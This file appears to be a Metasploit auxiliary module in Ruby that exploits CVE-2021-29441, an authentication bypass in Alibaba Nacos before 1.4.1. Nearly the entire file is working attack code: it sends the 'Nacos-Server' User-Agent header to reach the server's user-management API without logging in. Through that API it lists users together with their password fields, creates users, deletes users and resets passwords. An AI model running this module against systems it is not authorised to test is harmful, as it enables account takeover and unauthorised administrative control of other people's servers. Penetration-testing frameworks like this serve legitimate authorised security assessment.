# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Nacos Authentication Bypass User Management',
        'Description' => %q{
          This module exploits an authentication bypass vulnerability in Alibaba Nacos
          versions prior to 1.4.1. By using the special User-Agent header 'Nacos-Server',
          an attacker can bypass authentication and perform administrative actions such
          as listing, creating, deleting, and updating user passwords.
        },
        'Author'      => [ 'K3ysTr0K3R' ],
        'References'  =>
          [
            [ 'CVE', '2021-29441' ],
            [ 'URL', 'https://github.com/alibaba/nacos/issues/4562' ],
            [ 'URL', 'https://github.com/ARPSyndicate/cvemon/blob/master/CVE-2021-29441' ],
            [ 'URL', 'https://github.com/K3ysTr0K3R/CVE-2021-29441'],
          ],
        'License'     => MSF_LICENSE,
        'Actions'     =>
          [
            ['CHECK',          { 'Description' => 'Check if the target is vulnerable' }],
            ['LIST_USERS',     { 'Description' => 'List existing users' }],
            ['CREATE_USER',    { 'Description' => 'Create a new user' }],
            ['DELETE_USER',    { 'Description' => 'Delete a user' }],
            ['UPDATE_PASSWORD',{ 'Description' => 'Update a user\'s password' }],
            ['EXPLOIT',        { 'Description' => 'Check vulnerability and, if vulnerable, create a new user' }]
          ],
        'DefaultAction' => 'EXPLOIT',
        'Notes'        =>
          {
            'Stability'   => [ CRASH_SAFE ],
            'Reliability' => [ REPEATABLE_SESSION ],
            'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
          }
      )
    )

    register_options(
      [
        Opt::RPORT(8848),
        OptString.new('TARGETURI', [true, 'Base path to Nacos', '/']),
        OptString.new('USERNAME', [false, 'Username for user-related actions']),
        OptString.new('PASSWORD', [false, 'Password for user creation or update']),
        OptString.new('NEW_PASSWORD', [false, 'New password for update action']),
        OptBool.new('SSL', [false, 'Use SSL', false])
      ]
    )
  end

  def validate
    if action.name == 'CREATE_USER' || action.name == 'EXPLOIT'
      if datastore['USERNAME'].nil? || datastore['USERNAME'].empty?
        fail_with(Failure::BadConfig, 'USERNAME must be set for this action')
      end
      if datastore['PASSWORD'].nil? || datastore['PASSWORD'].empty?
        fail_with(Failure::BadConfig, 'PASSWORD must be set for this action')
      end
    end

    if action.name == 'DELETE_USER'
      if datastore['USERNAME'].nil? || datastore['USERNAME'].empty?
        fail_with(Failure::BadConfig, 'USERNAME must be set for delete action')
      end
    end

    if action.name == 'UPDATE_PASSWORD'
      if datastore['USERNAME'].nil? || datastore['USERNAME'].empty?
        fail_with(Failure::BadConfig, 'USERNAME must be set for update action')
      end
      if datastore['NEW_PASSWORD'].nil? || datastore['NEW_PASSWORD'].empty?
        fail_with(Failure::BadConfig, 'NEW_PASSWORD must be set for update action')
      end
    end
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/nacos/v1/auth/users'),
      'vars_get' => { 'pageNo' => 1, 'pageSize' => 1 },
      'headers' => { 'User-Agent' => 'Nacos-Server' }
    )

    return Exploit::CheckCode::Unknown('No response from target') unless res

    if res.code == 200 && res.get_json_document&.key?('pageItems')
      return Exploit::CheckCode::Vulnerable('Target appears vulnerable to Nacos authentication bypass')
    end

    Exploit::CheckCode::Safe('Target does not appear vulnerable')
  end

  def run
    validate

    case action.name
    when 'CHECK'
      check
    when 'EXPLOIT'
      if check == Exploit::CheckCode::Vulnerable
        create_user
      else
        print_error('Target is not vulnerable – aborting.')
      end
    when 'LIST_USERS'
      list_users
    when 'CREATE_USER'
      create_user
    when 'DELETE_USER'
      delete_user
    when 'UPDATE_PASSWORD'
      update_password
    end
  end

  private

  def send_nacos_request(method, uri, params = {}, data = nil)
    opts = {
      'method' => method,
      'uri' => normalize_uri(target_uri.path, uri),
      'headers' => { 'User-Agent' => 'Nacos-Server' },
      'vars_get' => params
    }

    opts['data'] = data if data
    opts['ctype'] = 'application/x-www-form-urlencoded' if data

    send_request_cgi(opts)
  end

  def list_users
    print_status('Listing users...')
    res = send_nacos_request('GET', '/nacos/v1/auth/users', { 'pageNo' => 1, 'pageSize' => 50 })
    
    unless res && res.code == 200
      print_error('Failed to retrieve user list')
      return
    end

    json = res.get_json_document
    unless json && json['pageItems']
      print_error('No user data in response')
      return
    end

    users = json['pageItems']
    if users.empty?
      print_status('No users found')
      return
    end

    table = Rex::Text::Table.new(
      'Header' => 'Nacos Users',
      'Columns' => ['Username', 'Password', 'Roles'],
      'Indent' => 0
    )

    users.each do |user|
      username = user['username'] || 'N/A'
      password = user['password'] || '********'
      roles = user['roles']&.join(', ') || 'user'
      table << [username, password, roles]
    end

    print_line(table.to_s)
  end

  def create_user
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    
    print_status("Creating user '#{username}'...")
    data = "username=#{Rex::Text.uri_encode(username)}&password=#{Rex::Text.uri_encode(password)}"
    res = send_nacos_request('POST', '/nacos/v1/auth/users', {}, data)
    
    if res && res.code == 200
      print_good("user #{username} with password #{password} created successfully")
    else
      print_error("Failed to create user: #{res&.code} #{res&.body}")
    end
  end

  def delete_user
    username = datastore['USERNAME']
    print_status("Deleting user '#{username}'...")
    res = send_nacos_request('DELETE', '/nacos/v1/auth/users', { 'username' => username })
    
    if res && res.code == 200
      print_good("User '#{username}' deleted successfully")
    else
      print_error("Failed to delete user: #{res&.code} #{res&.body}")
    end
  end

  def update_password
    username = datastore['USERNAME']
    new_password = datastore['NEW_PASSWORD']
    
    print_status("Updating password for user '#{username}'...")
    params = { 'username' => username, 'password' => new_password }
    res = send_nacos_request('PUT', '/nacos/v1/auth/users', params)
    
    if res && res.code == 200
      print_good("Password for '#{username}' updated successfully")
    else
      print_error("Failed to update password: #{res&.code} #{res&.body}")
    end
  end
end
